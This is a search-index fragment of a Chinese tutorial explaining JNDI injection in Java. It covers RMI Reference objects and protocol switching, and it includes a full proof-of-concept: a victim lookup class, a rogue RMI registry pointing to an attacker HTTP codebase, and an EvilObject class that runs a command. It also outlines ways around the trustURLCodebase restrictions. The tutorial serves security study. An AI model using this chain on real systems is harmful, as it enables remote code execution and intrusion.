com.sun.jndi.rmi.object.trustURLCodebase\u3001com.sun.jndi.cosnaming.object.trustURLCodebase\u7b49\u5c5e\u6027\u7684\u9650\u5236\uff0c\u6240\u4ee5\u5229\u7528\u9762\u66f4\u5e7f \u4f46\u662f\u5728Oracle JDK 11.0.1\u30018u191\u30017u201\u30016u211\u4e4b\u540e com.sun.jndi.ldap.object.trustURLCodebase \u5c5e\u6027\u7684\u9ed8\u8ba4\u503c\u88ab\u8c03\u6574\u4e3afalse\uff0c\u8fd8\u5bf9\u5e94\u7684\u5206\u914d\u4e86\u4e00\u4e2a\u6f0f\u6d1e\u7f16\u53f7CVE-2018-3149\u3002 \u501f\u7528\u4e00\u4e0b\u4e09\u53ea\u5e08\u5085\u7684\u56fe \u7ed5\u8fc7\u7684\u4e24\u79cd\u601d\u8def: \u627e\u5230\u4e00\u4e2a\u53d7\u5bb3\u8005\u672c\u5730CLASSPATH\u4e2d\u7684\u7c7b\u4f5c\u4e3a\u6076\u610f\u7684Reference Factory\u5de5\u5382\u7c7b\uff0c\u5e76\u5229\u7528\u8fd9\u4e2a\u672c\u5730\u7684Factory\u7c7b\u6267\u884c\u547d\u4ee4\u3002 \u5229\u7528LDAP\u76f4\u63a5\u8fd4\u56de\u4e00\u4e2a\u6076\u610f\u7684\u5e8f\u5217\u5316\u5bf9\u8c61\uff0cJNDI\u6ce8\u5165\u4f9d\u7136\u4f1a\u5bf9\u8be5\u5bf9\u8c61\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c\uff0c\u5229\u7528\u53cd\u5e8f\u5217\u5316Gadget\u5b8c\u6210\u547d\u4ee4\u6267\u884c\u3002 \u770b\u4e0a\u53bb\u4f3c\u4e4e\u5f88\u597d\u7406\u89e3\uff0c\u6df1\u5165\u7684\u6765\u770b\u770b\u5427\u3002 \u5229\u7528\u672c\u5730\u7c7b \u4e0a\u9762\u6211\u4eec\u8bb2\u5230\u4e86jndi\u6ce8\u5165\u7684\u6d41\u7a0b\uff0c\u63d0\u5230\u4e86**\u5982\u679c\u672c\u5730\u65e0\u6cd5\u52a0\u8f7d\u4e14ref\u4e2dclassFactoryLocation\u5c5e\u6027\u503c\u4e0d\u4e3a\u7a7a\uff0c\u5c31\u4ece\u6b64\u5c5e\u6027\u6307\u5b9a\u7684\u503c\u8fdc\u7a0b\u83b7\u53d6\u52a0\u8f7d\u7c7b **\uff0c\u5982\u679c\u672c\u5730\u53ef\u4ee5\u52a0\u8f7d\u5462\uff1f\u662f\u4e0d\u662f\u4e5f\u80fd\u9020\u6210\u653b\u51fb\uff1f \u770b1\u5904\uff0c\u4f1a\u5148\u8c03\u7528loadClass\u8fdb\u884c\u672c\u5730\u52a0\u8f7dref\u7684\u6307\u5b9a\u7c7b \u8ddf\u8fdb\u540e\u4f1a\u6765\u5230VersionHelper12#loadClass\uff0c\u7136\u540e\u4f1a\u8fd4\u56deref\u6307\u5b9a\u7684\u7c7b \u8fd4\u56de\u6307\u5b9a\u7c7b\u540e\u540e\u518d\u5f80\u4e0a\u8d70\uff0c\u6765\u5230getObjectInstance\uff0c\u4f1a\u53d1\u73b0\u8c03\u7528\u4e86\u6307\u5b9a\u7c7b\u7684getObjectInstance\u65b9\u6cd5\u2014\u2014\u6211\u4eec\u8981\u9700\u8981\u7684\u6076\u610f\u4ee3\u7801\u89e6\u53d1\u70b9 \u6240\u4ee5\u6211\u4eec\u53ea\u9700\u8981\u627e\u5230\u4e00\u4e2a\u672c\u5730\u7c7b\uff0c\u5176\u5fc5\u987b\u5b9e\u73b0javax.naming.spi.ObjectFactory\u63a5\u53e3,\u56e0\u4e3a\u5728javax.naming.spi.NamingManager#getObjectFactoryFromReference\u6700\u540e\u7684return\u8bed\u53e5\u5bf9Factory\u7c7b\u7684\u5b9e\u4f8b\u5bf9\u8c61\u8fdb\u884c\u4e86\u7c7b\u578b\u8f6c\u6362 \u5e76\u4e14\u8be5\u5de5\u5382\u7c7b\u81f3\u5c11\u5b58\u5728\u4e00\u4e2agetObjectInstance()\u65b9\u6cd5 \uff08\u53ef\u4ee5\u7528\u4e8e\u6267\u884c\u6076\u610f\u4ee3\u7801\u7684\uff09 TOMCAT8 tomcat8\u6709\u4e00\u4e2a\u7c7borg.apache.naming.factory.BeanFactory\uff0c\u5176\u5b9e\u73b0\u4e86ObjectFactory\u63a5\u53e3\u4e14\u6709getObjectInstance\u65b9\u6cd5\uff0c\u66f4\u91cd\u8981\u7684\u662f\u5176getObjectInstance\u53ef\u4ee5\u6267\u884c\u6076\u610f\u4ee3\u7801\u3002 \u5b83\u4f1a\u5148\u83b7\u53d6ref\u5bf9\u8c61\u4e2d\u7684resourceclass Groovy ldap\u53cd\u5e8f\u5217\u5316","title":"JNDI\u6ce8\u5165\u539f\u7406\u6d45\u6790"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/#jndi","text":"","title":"JNDI\u6ce8\u5165\u539f\u7406\u6d45\u6790"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/#_1","text":"JNDI \u7b80\u4ecb JNDI\u6ce8\u5165 RMI\u5de5\u4f5c\u539f\u7406 Reference\u7c7b JNDI \u534f\u8bae\u8f6c\u6362 JNDI\u6ce8\u5165 JNDI\u6ce8\u5165\u5206\u6790 JNDI\u6ce8\u5165\uff1a\u9ad8\u7248\u672c\u5982\u4f55\u5229\u7528\uff1f TrustURLCodeBase \u6982\u89c8 \u5229\u7528\u672c\u5730\u7c7b TOMCAT8 Groovy ldap\u53cd\u5e8f\u5217\u5316 JNDI\u6ce8\u5165\u4f9d\u8d56RMI\uff0c\u6240\u4ee5\u5728\u5b66\u4e60JNDI\u6ce8\u5165\u524d\u52a1\u5fc5\u4e86\u89e3\u4e00\u4e0bRMI","title":"\u76ee\u5f55"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/#jndi_1","text":"JNDI (Java Naming and Directory Interface) \u662f\u4e00\u4e2ajava\u4e2d\u7684\u6280\u672f\uff0c\u7528\u4e8e\u63d0\u4f9b\u4e00\u4e2a\u8bbf\u95ee\u5404\u79cd\u8d44\u6e90\u7684\u63a5\u53e3\u3002\u6bd4\u5982\u901a\u8fc7JNDI\u53ef\u4ee5\u5728\u5c40\u57df\u7f51\u4e0a\u5b9a\u4f4d\u4e00\u53f0\u6253\u5370\u673a\uff0c\u6216\u8005\u5b9a\u4f4d\u6570\u636e\u5e93\u670d\u52a1\uff0c\u8fdc\u7a0bJAVA\u5bf9\u8c61\u7b49\u3002 JNDI\u5e95\u5c42\u652f\u6301RMI\u8fdc\u7a0b\u5bf9\u8c61\uff0cRMI\u6ce8\u518c\u7684\u670d\u52a1\u53ef\u4ee5\u76f4\u63a5\u88abJNDI\u63a5\u53e3\u8bbf\u95ee\u8c03\u7528\u3002","title":"JNDI \u7b80\u4ecb"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/#jndi_2","text":"","title":"JNDI\u6ce8\u5165"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/#rmi","text":"\u9996\u5148\u6211\u4eec\u5148\u601d\u8003\u4e00\u4e0bRMI\u7684\u5de5\u4f5c\u539f\u7406\u662f\u4ec0\u4e48\u3002 1.\u670d\u52a1\u5668\u521b\u5efa\u597d\u7ee7\u627f\u4e8eRemote\u63a5\u53e3\u7684\u7c7b\uff0c\u5e76\u628a\u5b83\u7ed1\u5b9a\u5230RMI\u670d\u52a1\u5668\u4e0a 2.\u5ba2\u6237\u7aef\u8bf7\u6c42RMI\u670d\u52a1\u5668\u4e0a\u7684\u7c7b 3.\u670d\u52a1\u7aef\u8fd4\u56de\u5ba2\u6237\u7aef\u6240\u8bf7\u6c42\u7c7b\u7684\u5b58\u6839stub\uff0c\u5ba2\u6237\u7aef\u5c06\u8fd9\u4e2astub\u770b\u4f5c\u5b9e\u4f8b\u5316\u5bf9\u8c61\u4f7f\u7528 4.\u5ba2\u6237\u7aef\u8c03\u7528stub\u7684\u67d0\u4e2a\u65b9\u6cd5\uff0c\u5e76\u4f20\u5165\u53c2\u6570\u3002\u8be5\u53c2\u6570\u4f1a\u53d1\u9001\u5230RMI\u670d\u52a1\u5668\u4e0a\uff0c\u7531RMI\u670d\u52a1\u5668\u6309\u7167\u5ba2\u6237\u7aef\u4f20\u6765\u7684\u53c2\u6570\u6765\u6267\u884c\u6307\u5b9a\u7684\u65b9\u6cd5 5.\u670d\u52a1\u5668\u6267\u884c\u5b8c\u540e\u5c06\u7ed3\u679c\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef \u6240\u4ee5\u4eceRMI\u8fd9\u4e00\u7aef\u6765\u770b\uff0c\u5ba2\u6237\u7aef\u83b7\u53d6\u4e86\u8fdc\u7a0b\u5bf9\u8c61\u540e\u6240\u6267\u884c\u7684\u6b64\u5bf9\u8c61\u7684\u65b9\u6cd5\uff0c\u90fd\u662f\u7531RMI\u670d\u52a1\u5668\u6765\u6267\u884c\u7684\u3002","title":"RMI\u5de5\u4f5c\u539f\u7406"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/#reference","text":"\u9996\u5148\u6765\u770b\u4e00\u4e0b\u5982\u4f55\u521b\u5efa\u4e00\u4e2a\u5bf9\u8c61Reference\u5e76\u5c06\u5176\u7ed1\u5b9a\u5230RMI\u670d\u52a1\u5668\u4e0a ......\u5b9a\u4e49\u597d\u4e86registry\uff0c\u5b83\u662f\u4e00\u4e2aRegistry\u5bf9\u8c61\uff08RMI\u4e2d\u7528\u4e8e\u5c06\u7c7b\u6ce8\u518c\u5230\u670d\u52a1\u5668\u4e0a\u7684\u5bf9\u8c61\uff09 Reference refObj = new Reference(\"refClassName\", \"insClassName\", \"http://a.com:12345\"); ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj); registry.bind(\"refObj\", refObjWrapper); \u524d\u9762\u8bf4\u5230RMI\u670d\u52a1\u5668\u4f1a\u5411\u5ba2\u6237\u7aef\u8fd4\u56destub\u6216\u8005\u8bf4\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5982\u679cRMI\u670d\u52a1\u5668\u4f20\u56de\u5ba2\u6237\u7aef\u4e00\u4e2aReference\u5bf9\u8c61\u5462\uff1f\u90a3\u5c31\u8981\u8bf4\u9053\u8bf4\u9053\u4e86\u3002 \u5bf9\u4e8eRMI\u670d\u52a1\u5668\u800c\u8a00\uff0c\u5411\u5ba2\u6237\u7aef\u4f20\u56de\u4e00\u4e2aReference\u5bf9\u8c61\u548c\u4f20\u56de\u5176\u4ed6\u5bf9\u8c61\u4e00\u6837\uff0c\u5e76\u6ca1\u6709\u591a\u5927\u533a\u522b\u3002 \u4f46\u662f\u5ba2\u6237\u7aef\u7531\u4e8e\u83b7\u53d6\u5230\u4e86\u4e00\u4e2aReference\u5b9e\u4f8b\uff0c\u6bd4\u5982\u8bf4\u5c31\u662f\u4e0a\u9762\u4ee3\u7801\u4e2d\u7684Reference\u5b9e\u4f8b\uff0c\u63a5\u4e0b\u6765\u5ba2\u6237\u7aef\u5c31\u4f1a\u5148\u5728CLASSPATH\u91cc\u5bfb\u627e\u88ab\u6807\u8bc6\u4e3arefClassName\u7684\u7c7b\u3002\u5982\u679c\u6ca1\u627e\u5230\uff0c\u5b83\u5c31\u4f1a\u53bb\u8bf7\u6c42http\\://a.com:12345/refClassName.class \u5bf9\u91cc\u9762\u7684\u7c7b\u8fdb\u884c\u52a8\u6001\u52a0\u8f7d\uff0c\u5e76\u8c03\u7528insClassName\u7c7b\u7684\u6784\u9020\u65b9\u6cd5\u3002\u6ce8\u610f\uff0c\u8c03\u7528insClassName\u7c7b\u7684\u6784\u9020\u65b9\u6cd5\u8fd9\u4e2a\u884c\u4e3a\u662f\u7531\u5ba2\u6237\u7aef\u5b8c\u6210\u7684\u3002 \u4e0a\u9762\u7684\u4e00\u7cfb\u5217\u884c\u4e3a\u53ef\u4ee5\u6982\u62ec\u4e3axiatu","title":"Reference\u7c7b"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/#jndi_3","text":"\u6211\u4eec\u5728\u901a\u8fc7JNDI\u8c03\u7528\u8fdc\u7a0b\u5bf9\u8c61\u65f6\uff0c\u9700\u8981\u8bbe\u7f6e\u73af\u5883\uff0c\u5c31\u50cf\u8fd9\u6837 Properties env = new Properties(); env.put(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.rmi.registry.RegistryContextFactory\"); //\u8bbe\u7f6e\u4e86rmi\u8bf7\u6c42\u65b9\u5f0f env.put(Context.PROVIDER_URL, \"rmi://localhost:1099\"); Context ctx = new InitialContext(env); \u6bd4\u5982\u4ee5\u4e0a\u4ee3\u7801\uff0c\u5c31\u8bbe\u7f6e\u4e86JNDI\u4f1a\u901a\u8fc7rmi\u7684\u65b9\u5f0f\u53bb\u8bf7\u6c42\u8fdc\u7a0b\u5bf9\u8c61\u3002 \u4f46\u662f\u5f53\u8c03\u7528lookup()\u6216\u8005search()\u65f6\uff0c\u53ef\u4ee5\u76f4\u63a5\u65e0\u89c6\u73af\u5883\u662f\u5982\u4f55\u8bbe\u7f6e\u8bf7\u6c42\u65b9\u5f0f\u7684\uff0c\u56e0\u4e3aJNDI\u6709\u534f\u8bae\u52a8\u6001\u8f6c\u6362\u673a\u5236\u3002\u4ec0\u4e48\u610f\u601d\u5462\uff1f\u770b\u770b\u4ee3\u7801\u5c31\u6653\u5f97\u4e86 Properties env = new Properties(); env.put(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.rmi.registry.RegistryContextFactory\"); env.put(Context.PROVIDER_URL, \"rmi://localhost:1099\"); Context ctx = new InitialContext(env); ctx.lookup(\"ldap://a.com/ou=foo,dc=foobar,dc=com\") \u4ee5\u4e0a\u4ee3\u7801\u6267\u884c\u540e\uff0c\u4f1a\u8c03\u7528ldap\u534f\u8bae\u53bb\u8bf7\u6c42\uff0c\u800c\u4e0d\u662frmi\u3002 \u8fd9\u662f\u56e0\u4e3alookup\u6216\u8005search\u51fd\u6570\u5728\u53c2\u6570\u4e3a\u7edd\u5bf9\u8def\u5f84URI\u7684\u60c5\u51b5\u4e0b\u52a8\u6001\u8f6c\u6362\u534f\u8bae\u4e3a\u53c2\u6570\u4e2d\u6307\u5b9a\u7684\u534f\u8bae\u3002","title":"JNDI \u534f\u8bae\u8f6c\u6362"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/#jndi_4","text":"\u5982\u679c\u6211\u4eec\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6\uff0cJNDI\u6ce8\u5165\u5c31\u4f1a\u6210\u529f JNDI\u8c03\u7528\u7684lookup\u53c2\u6570\u53ef\u63a7 URI\u53ef\u8fdb\u884c\u52a8\u6001\u534f\u8bae\u8f6c\u6362 Reference\u5bf9\u8c61\u6307\u5b9a\u7c7b\u4f1a\u88ab\u52a0\u8f7d\u5e76\u5b9e\u4f8b\u5316 \u5176\u5b9e\u6700\u91cd\u8981\u7684\u5c31\u662f\u7b2c\u4e00\u6761\u3002 \u4e0b\u9762\u7528\u4e00\u5f20\u56fe\u6982\u62ec\u4eceJNDI\u6ce8\u5165\u5230RCE\u7684\u6d41\u7a0b 1.\u653b\u51fb\u8005\u63a7\u5236\u4e86lookup\u53c2\u6570 2.\u653b\u51fb\u8005\u5c06lookup\u53c2\u6570\u66ff\u6362\u4e3a\u53bb\u8bf7\u6c42\u6076\u610f\u670d\u52a1\u5668A\u4e0a\u7684Reference\u5bf9\u8c61 3.\u6076\u610f\u670d\u52a1\u5668A\u8fd4\u56deReference\u5bf9\u8c61 4.\u53d7\u5bb3\u673a\u5668\u83b7\u5f97Reference\u5bf9\u8c61\u540e\u5148\u5728CLASSPATH\u4e2d\u67e5\u627eReference\u5bf9\u8c61\u4e2d\u7684\u6307\u5b9a\u7c7b\u662f\u5426\u5b58\u5728\uff0c\u82e5\u4e0d\u5b58\u5728\u5219\u8bf7\u6c42Reference\u5bf9\u8c61\u4e2d\u6307\u5b9a\u7684\u6076\u610f\u670d\u52a1\u5668B\u53bb\u83b7\u5f97\u6307\u5b9a\u7c7b 5.\u6076\u610f\u670d\u52a1\u5668B\u8fd4\u56de\u6307\u5b9a\u7c7b 6.\u53d7\u5bb3\u673a\u5668\u5f97\u5230\u6307\u5b9a\u7c7b\u540e\uff0c\u6267\u884c\u6307\u5b9a\u7c7b\u7684\u6784\u9020\u51fd\u6570\uff0c\u4ece\u800c\u8fbe\u5230RCE \u4e0b\u9762\u662f\u4ee3\u7801\u5b9e\u73b0 \u53d7\u5bb3\u673a\u5668 import java.rmi.Remote; import java.rmi.RemoteException; import javax.naming.Context; import javax.naming.InitialContext; interface IHello extends Remote { abstract String sayHello(String name) throws RemoteException; } public class CallService { public static void main(String args[]) throws Exception{ if(args.length<1){ System.out.println(\"Plz input url\"); System.exit(-1); } else { // JNDI \u83b7\u53d6 RMI \u4e0a\u7684\u65b9\u6cd5\u5bf9\u8c61\u5e76\u8fdb\u884c\u8c03\u7528 Context ctx = new InitialContext(); IHello rHello = (IHello) ctx.lookup((String)args[0]); System.out.println(rHello.sayHello(\"tom\")); } } } RMI import com.sun.jndi.rmi.registry.ReferenceWrapper; import javax.naming.Reference; import java.rmi.Remote; import java.rmi.RemoteException; import java.rmi.registry.*; import java.rmi.server.UnicastRemoteObject; public class evilrmi { public static void main(String[] args) throws Exception{ Registry registry = LocateRegistry.createRegistry(1010); Reference refObj = new Reference(\"EvilObject\",\"EvilObject\",\"http://192.168.111.1:80/\"); ReferenceWrapper refObjWra = new ReferenceWrapper(refObj); registry.bind(\"refObj\",refObjWra); System.out.println(\"gogo\"); } } EvilObject import java.lang.Runtime; import java.lang.Process; public class EvilObject { public EvilObject() throws Exception { Runtime rt = Runtime.getRuntime(); String[] commands = {\"calc\"}; Process pc = rt.exec(commands); pc.waitFor(); } } \u6211\u4eec\u5148\u8fd0\u884cRMI\u670d\u52a1\u5668\uff0c\u7136\u540e\u628aEvilObject.class\u653e\u7f6e\u4e8ehttp\\://192.168.111.1:80/\u4e0b\uff0c\u7136\u540e\u6307\u5b9alookup\u53c2\u6570\u4e3a\u6211\u4eec\u7684\u6076\u610fRMI\u670d\u52a1\u5668\u53bb\u8fd0\u884c\u53d7\u5bb3\u673a\u5668\u3002","title":"JNDI\u6ce8\u5165"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/#jndi_5","text":"\u8c03\u7528\u6808\u5982\u4e0b \u8ddf\u8fdblookup\u65b9\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6b64\u5904 \u518d\u6b21\u8ddf\u8fdblookup\u65b9\u6cd5 \u518d\u6b21\u8ddf\u8fdblookup\u65b9\u6cd5 \u8ddf\u8fdbdecodeObject \u8ddf\u8fdb\uff0c\u6765\u5230\u6b64\u5904\u3002\u6b64\u5904getObjectFactoryFromReference \u662f\u53bb\u83b7\u53d6Reference\u5bf9\u8c61\u3002 ref\u548cf\u6b64\u65f6\u5206\u522b\u5bf9\u5e94\u7684\u503c\u4e3aReference\u7c7b\u540d\u548cReference\u6307\u5411\u7684\u7c7b\u7684\u7c7b\u540d \u518d\u5ea6\u8ddf\u8fdb 1\u5904\u662f\u5c1d\u8bd5\u672c\u5730\u52a0\u8f7d\uff08\u4eceCLASSPATH\u4e2d\uff09Reference\u6307\u5b9a\u7684\u7c7b\uff0c2\u5904\u662f\u5982\u679c\u672c\u5730\u65e0\u6cd5\u52a0\u8f7d\u4e14ref\u4e2dclassFactoryLocation\u5c5e\u6027\u503c\u4e0d\u4e3a\u7a7a\uff0c\u5c31\u4ece\u6b64\u5c5e\u6027\u6307\u5b9a\u7684\u503c\u8fdc\u7a0b\u83b7\u53d6\u52a0\u8f7d\u7c7b\u3002\u6700\u540e\u57283\u5904\u5bf9\u52a0\u8f7d\u5230\u7c7b\u6267\u884c\u5b9e\u4f8b\u5316\uff0c\u4ece\u800c\u89e6\u53d1\u6784\u9020\u51fd\u6570\u3002","title":"JNDI\u6ce8\u5165\u5206\u6790"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/#jndi_6","text":"","title":"JNDI\u6ce8\u5165\uff1a\u9ad8\u7248\u672c\u5982\u4f55\u5229\u7528\uff1f"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/#trusturlcodebase","text":"JDK 6u141, JDK 7u131, JDK 8u121 \u4ee5\u53ca\u66f4\u9ad8\u7248\u672c\u4e2dJava\u63d0\u5347\u4e86JNDI \u9650\u5236\u4e86Naming/Directory\u670d\u52a1\u4e2dJNDI Reference \u8fdc\u7a0b \u52a0\u8f7dObject Factory\u7c7b\u7684\u7279\u6027\uff0c\u6240\u4ee5\u4f1a\u6267\u884c\u4ee5\u4e0a\u6d41\u7a0b\u4f1a\u6709\u5982\u4e0b\u62a5\u9519 The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'. \u7cfb\u7edf\u5c5e\u6027 com.sun.jndi.rmi.object.trustURLCodebase\u3001com.sun.jndi.cosnaming.object.trustURLCodebase \u7684\u9ed8\u8ba4\u503c\u53d8\u4e3afalse\uff0c\u5373\u9ed8\u8ba4\u4e0d\u5141\u8bb8\u4ece\u8fdc\u7a0b\u7684Codebase\u52a0\u8f7dReference\u5de5\u5382\u7c7b\u3002","title":"TrustURLCodeBase"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/#_2","text":"\u4ee5\u4e0a\u662fJNDI Reference+RMI\u7684\u5229\u7528\u65b9\u5f0f\uff0c\u9664\u6b64\u4e4b\u5916\u8fd8\u6709\u4e00\u4e2aJNDI Reference+ldap \u7684\u5229\u7528\u65b9\u5f0f\uff0c\u64cd\u4f5c\u4e0eJNDI Reference+RMI\u5927\u540c\u5c0f\u5f02\uff0c\u4e5f\u5c31\u662f\u901a\u8fc7ldap\u534f\u8baelookup\u4e00\u4e2a\u6076\u610f\u670d\u52a1\u5668\u5e76\u83b7\u5f97\u6076\u610fReference\u5bf9\u8c61\uff0c\u5e76\u4e14LDAP\u670d\u52a1\u7684Reference\u8fdc\u7a0b\u52a0\u8f7dFactory\u7c7b\u4e0d\u53d7 com.sun.jndi.rmi.object.trustURLCodebase\u3001com.sun.jndi.cosnaming.object.trustURLCodebase\u7b49\u5c5e\u6027\u7684\u9650\u5236\uff0c\u6240\u4ee5\u5229\u7528\u9762\u66f4\u5e7f \u4f46\u662f\u5728Oracle JDK 11.0.1\u30018u191\u30017u201\u30016u211\u4e4b\u540e com.sun.jndi.ldap.object.trustURLCodebase \u5c5e\u6027\u7684\u9ed8\u8ba4\u503c\u88ab\u8c03\u6574\u4e3afalse\uff0c\u8fd8\u5bf9\u5e94\u7684\u5206\u914d\u4e86\u4e00\u4e2a\u6f0f\u6d1e\u7f16\u53f7CVE-2018-3149\u3002 \u501f\u7528\u4e00\u4e0b\u4e09\u53ea\u5e08\u5085\u7684\u56fe \u7ed5\u8fc7\u7684\u4e24\u79cd\u601d\u8def: \u627e\u5230\u4e00\u4e2a\u53d7\u5bb3\u8005\u672c\u5730CLASSPATH\u4e2d\u7684\u7c7b\u4f5c\u4e3a\u6076\u610f\u7684Reference Factory\u5de5\u5382\u7c7b\uff0c\u5e76\u5229\u7528\u8fd9\u4e2a\u672c\u5730\u7684Factory\u7c7b\u6267\u884c\u547d\u4ee4\u3002 \u5229\u7528LDAP\u76f4\u63a5\u8fd4\u56de\u4e00\u4e2a\u6076\u610f\u7684\u5e8f\u5217\u5316\u5bf9\u8c61\uff0cJNDI\u6ce8\u5165\u4f9d\u7136\u4f1a\u5bf9\u8be5\u5bf9\u8c61\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c\uff0c\u5229\u7528\u53cd\u5e8f\u5217\u5316Gadget\u5b8c\u6210\u547d\u4ee4\u6267\u884c\u3002 \u770b\u4e0a\u53bb\u4f3c\u4e4e\u5f88\u597d\u7406\u89e3\uff0c\u6df1\u5165\u7684\u6765\u770b\u770b\u5427\u3002","title":"\u6982\u89c8"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/#_3","text":"\u4e0a\u9762\u6211\u4eec\u8bb2\u5230\u4e86jndi\u6ce8\u5165\u7684\u6d41\u7a0b\uff0c\u63d0\u5230\u4e86**\u5982\u679c\u672c\u5730\u65e0\u6cd5\u52a0\u8f7d\u4e14ref\u4e2dclassFactoryLocation\u5c5e\u6027\u503c\u4e0d\u4e3a\u7a7a\uff0c\u5c31\u4ece\u6b64\u5c5e\u6027\u6307\u5b9a\u7684\u503c\u8fdc\u7a0b\u83b7\u53d6\u52a0\u8f7d\u7c7b **\uff0c\u5982\u679c\u672c\u5730\u53ef\u4ee5\u52a0\u8f7d\u5462\uff1f\u662f\u4e0d\u662f\u4e5f\u80fd\u9020\u6210\u653b\u51fb\uff1f \u770b1\u5904\uff0c\u4f1a\u5148\u8c03\u7528loadClass\u8fdb\u884c\u672c\u5730\u52a0\u8f7dref\u7684\u6307\u5b9a\u7c7b \u8ddf\u8fdb\u540e\u4f1a\u6765\u5230VersionHelper12#loadClass\uff0c\u7136\u540e\u4f1a\u8fd4\u56deref\u6307\u5b9a\u7684\u7c7b \u8fd4\u56de\u6307\u5b9a\u7c7b\u540e\u540e\u518d\u5f80\u4e0a\u8d70\uff0c\u6765\u5230getObjectInstance\uff0c\u4f1a\u53d1\u73b0\u8c03\u7528\u4e86\u6307\u5b9a\u7c7b\u7684getObjectInstance\u65b9\u6cd5\u2014\u2014\u6211\u4eec\u8981\u9700\u8981\u7684\u6076\u610f\u4ee3\u7801\u89e6\u53d1\u70b9 